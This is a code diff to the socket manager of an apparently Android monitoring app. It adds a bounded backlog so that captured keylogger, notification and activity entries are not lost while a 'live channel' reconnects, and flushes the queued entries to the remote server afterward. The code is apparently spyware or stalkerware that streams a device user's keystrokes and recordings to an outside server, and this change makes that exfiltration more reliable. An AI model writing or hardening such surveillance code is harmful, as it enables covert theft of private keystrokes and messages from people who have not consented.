@@ -29,6 +29,7 @@ import javax.net.ssl.SSLSocketFactory;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 import java.security.cert.X509Certificate;
+import java.util.ArrayDeque;
 import com.task.tusker.utils.ResourceGuard;
 import com.task.tusker.utils.IdleSuspensionManager;
 import java.util.concurrent.ExecutorService;
@@ -140,6 +141,11 @@ public class SocketManager {
     private Socket   liveSocket;
     private PrintWriter liveOut;
     private volatile boolean liveConnected = false;
+    // Events can be produced while the secondary socket is reconnecting. Keep
+    // a small bounded backlog so a transient live-channel race does not lose
+    // keylogger/notification/activity entries that are already stored locally.
+    private final ArrayDeque<JSONObject> pendingLiveEvents = new ArrayDeque<>();
+    private static final int MAX_PENDING_LIVE_EVENTS = 200;
     // Single-thread executor prevents multiple concurrent live loops from stacking up
     private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
@@ -972,6 +978,7 @@ public class SocketManager {
                 msg.put("data", d);
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
+                flushPendingLiveEventsLocked();
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
@@ -1049,7 +1056,20 @@ public class SocketManager {
      */
     private boolean sendLiveOnly(String event, JSONObject data) {
         synchronized (liveLock) {
-            if (!liveConnected || liveOut == null) return false;
+            if (!liveConnected || liveOut == null) {
+                try {
+                    JSONObject queued = new JSONObject();
+                    queued.put("event", event);
+                    queued.put("data", data);
+                    if (pendingLiveEvents.size() >= MAX_PENDING_LIVE_EVENTS) {
+                        pendingLiveEvents.removeFirst();
+                    }
+                    pendingLiveEvents.addLast(queued);
+                } catch (Exception e) {
+                    Log.e(TAG, "queueLiveEvent [" + event + "] error: " + e.getMessage());
+                }
+                return false;
+            }
             try {
                 JSONObject msg = new JSONObject();
                 msg.put("event", event);
@@ -1061,6 +1081,20 @@ public class SocketManager {
             } catch (Exception e) {
                 Log.e(TAG, "sendLiveOnly [" + event + "] error: " + e.getMessage());
                 return false;
+            }
+        }
+    }
+
+    /** Flush events captured during a short live-channel reconnect window. */
+    private void flushPendingLiveEventsLocked() {
+        if (!liveConnected || liveOut == null) return;
+        while (!pendingLiveEvents.isEmpty()) {
+            try {
+                liveOut.print(pendingLiveEvents.removeFirst().toString() + "\n");
+                liveOut.flush();
+                if (liveOut.checkError()) return;
+            } catch (Exception e) {
+                return;
             }
         }
     }
